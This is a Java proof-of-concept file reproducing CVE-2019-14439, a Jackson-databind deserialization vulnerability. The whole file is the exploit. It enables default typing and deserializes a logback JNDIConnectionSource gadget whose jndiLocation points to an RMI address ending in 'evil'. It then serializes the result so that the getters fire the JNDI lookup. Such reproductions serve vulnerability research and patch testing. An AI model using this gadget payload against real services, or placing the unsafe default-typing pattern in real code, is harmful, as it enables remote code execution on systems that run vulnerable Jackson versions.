package com.firebasky.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class CVE_2019_14439 {
    public static void main(String[] args) throws IOException {
        String json = "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"rmi://127.0.0.1:1088/evil\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);//调用所有个 get 方法
    }
}
